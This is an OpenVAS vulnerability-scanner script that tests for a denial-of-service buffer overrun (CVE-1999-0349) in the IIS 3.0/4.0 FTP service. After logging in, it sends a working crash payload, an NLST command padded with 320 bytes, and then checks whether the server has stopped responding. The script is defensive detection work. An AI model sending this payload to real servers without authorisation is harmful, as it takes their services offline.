###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms99-33_remote.nasl 8374 2018-01-11 10:55:51Z cfischer $
#
# Microsoft IIS FTP Server 'Malformed FTP List Request' DOS Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allows remote users to crash the application
  leading to denial of service condition or execute arbitrary code.
  Impact Level: System/Application";
tag_affected = "Microsoft Internet Information Services version 3.0 and 4.0";
tag_insight = "The FTP service in IIS has an unchecked buffer in a component that processes
  'list' commands. A constructed 'list' request could cause arbitrary code to
  execute on the server via a classic buffer overrun technique.";
tag_solution = "Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link.
  http://technet.microsoft.com/en-us/security/bulletin/ms99-033";
tag_summary = "This host is missing important security update according to
  Microsoft Bulletin MS99-033.";

CPE = "cpe:/a:microsoft:iis_ftp";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802440");
  script_version("$Revision: 8374 $");
  script_cve_id("CVE-1999-0349");
  script_bugtraq_id(192);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-01-11 11:55:51 +0100 (Thu, 11 Jan 2018) $");
  script_tag(name:"creation_date", value:"2012-07-04 16:21:03 +0530 (Wed, 04 Jul 2012)");
  script_name("Microsoft IIS FTP Server 'Malformed FTP List Request' DOS Vulnerability");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/nvd/246545.php");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms99-003");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_require_keys("MS/IIS-FTP/Installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

ftpPort = "";
soc = "";
ftplogin = "";
soc2 = "";
soc3 = "";
port2 = "";
recv = "";

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

## Check for the broken port
if(get_kb_item('ftp/'+ftpPort+'/broken')){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

login = get_kb_item("ftp/login");
if(!login){
  login = "anonymous";
}

pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

ftplogin = ftp_log_in(socket:soc, user:login, pass:pass);

## Exit if not able to login
if(!ftplogin)
{
  close(soc);
  exit(0);
}

port2 = ftp_pasv(socket:soc);
if (!port2){
  exit(0);
}

soc2 = open_sock_tcp(port2, transport:get_port_transport(ftpPort));

## Construct attack request
command = strcat('NLST ', crap(320), '\r\n');
send(socket:soc, data:command);

close(soc2);
close(soc);

sleep(7);

soc3 = open_sock_tcp(ftpPort);
if(soc3)
{
  recv = ftp_recv_line(socket:soc3);
  if(!recv){
    security_message(port:ftpPort);
  }
  close(soc3);
}
else{
  security_message(port:ftpPort);
}
